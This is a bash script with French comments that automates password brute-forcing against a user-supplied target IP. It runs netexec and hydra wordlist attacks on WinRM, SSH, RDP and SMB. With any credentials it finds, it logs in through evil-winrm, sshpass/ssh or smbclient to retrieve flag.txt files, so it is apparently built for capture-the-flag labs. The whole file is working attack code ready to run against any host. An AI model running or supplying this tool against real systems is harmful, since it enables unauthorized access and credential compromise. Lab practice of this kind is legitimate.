#!/bin/bash

# === Entrée utilisateur ===
read -rp "🔍 IP de la machine cible à tester : " TARGET

USERS="user.list"
PASSWORDS="password.list"
LOGDIR="logs/$(date +%Y%m%d-%H%M%S)"
REQUIRED_TOOLS=("netexec" "evil-winrm" "hydra" "sshpass" "smbclient")

# Vérification des fichiers d'entrée
if [[ ! -f "$USERS" || ! -f "$PASSWORDS" ]]; then
    echo "[❌] Fichiers $USERS ou $PASSWORDS manquants. Place-les dans le même dossier que ce script."
    exit 1
fi

mkdir -p "$LOGDIR"

echo "[*] Vérification des outils nécessaires..."

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "[!] $tool non trouvé. Tentative d'installation..."
        case $tool in
            netexec)
                sudo apt install -y netexec || echo "[!] Installation manuelle de netexec requise"
                ;;
            evil-winrm)
                sudo gem install evil-winrm
                ;;
            hydra)
                sudo apt install -y hydra
                ;;
            sshpass)
                sudo apt install -y sshpass
                ;;
            smbclient)
                sudo apt install -y smbclient
                ;;
        esac
    else
        echo "[✔] $tool est installé"
    fi
done

echo -e "\n[*] Début de l'audit sur $TARGET..."

### 1. Test WinRM
echo "[+] Testing WinRM..."
netexec winrm "$TARGET" -u @"$USERS" -p @"$PASSWORDS" > "$LOGDIR/winrm.log"
WINRM_CREDS=$(grep -E "Pwn3d!" "$LOGDIR/winrm.log" | awk '{print $5}' | head -n1)

if [ -n "$WINRM_CREDS" ]; then
    USER=$(echo "$WINRM_CREDS" | cut -d: -f1)
    PASS=$(echo "$WINRM_CREDS" | cut -d: -f2)
    echo "[+] WinRM credentials found: $USER / $PASS"
    echo "[+] Tentative de connexion avec Evil-WinRM..."
    evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" -s "C:\Users" -c "dir /s flag.txt" > "$LOGDIR/winrm_flag.txt"
else
    echo "[!] Aucun accès WinRM trouvé."
fi

### 2. Test SSH
echo "[+] Testing SSH..."
hydra -L "$USERS" -P "$PASSWORDS" ssh://"$TARGET" -t 4 > "$LOGDIR/ssh.log"
SSH_CREDS=$(grep "login:" "$LOGDIR/ssh.log" | head -n1)

if [ -n "$SSH_CREDS" ]; then
    USER=$(echo "$SSH_CREDS" | awk '{print $5}')
    PASS=$(echo "$SSH_CREDS" | awk '{print $7}')
    echo "[+] SSH credentials found: $USER / $PASS"
    echo "[+] Récupération du flag..."
    sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$TARGET" 'type C:\Users\*\Desktop\flag.txt' > "$LOGDIR/ssh_flag.txt"
else
    echo "[!] Aucun accès SSH trouvé."
fi

### 3. Test RDP
echo "[+] Testing RDP..."
hydra -L "$USERS" -P "$PASSWORDS" rdp://"$TARGET" -t 2 -W 3 > "$LOGDIR/rdp.log"
RDP_CREDS=$(grep "login:" "$LOGDIR/rdp.log" | head -n1)

if [ -n "$RDP_CREDS" ]; then
    USER=$(echo "$RDP_CREDS" | awk '{print $5}')
    PASS=$(echo "$RDP_CREDS" | awk '{print $7}')
    echo "[+] RDP credentials found: $USER / $PASS"
    echo "[*] Connecte-toi avec xfreerdp ou guacamole pour récupérer le flag manuellement."
else
    echo "[!] Aucun accès RDP trouvé."
fi

### 4. Test SMB
echo "[+] Testing SMB..."
netexec smb "$TARGET" -u @"$USERS" -p @"$PASSWORDS" --shares > "$LOGDIR/smb.log"
SMB_CREDS=$(grep -E "\+.*:" "$LOGDIR/smb.log" | awk '{print $5}' | head -n1)

if [ -n "$SMB_CREDS" ]; then
    USER=$(echo "$SMB_CREDS" | cut -d: -f1)
    PASS=$(echo "$SMB_CREDS" | cut -d: -f2)
    echo "[+] SMB credentials found: $USER / $PASS"
    echo "[+] Récupération du flag avec smbclient..."
    echo -e "ls\nget flag.txt\nexit\n" | smbclient -U "$USER%$PASS" "//$TARGET/SHARE" > "$LOGDIR/smb_flag.txt"
else
    echo "[!] Aucun accès SMB trouvé."
fi

### Résumé des flags trouvés
echo -e "\n[🏁] Résumé des flags trouvés :"
for f in "$LOGDIR"/*_flag.txt; do
    if [[ -s "$f" ]]; then
        echo -e "\n[$f] :"
        cat "$f"
    fi
done

echo -e "\n[✓] Audit terminé. Résultats enregistrés dans : $LOGDIR"
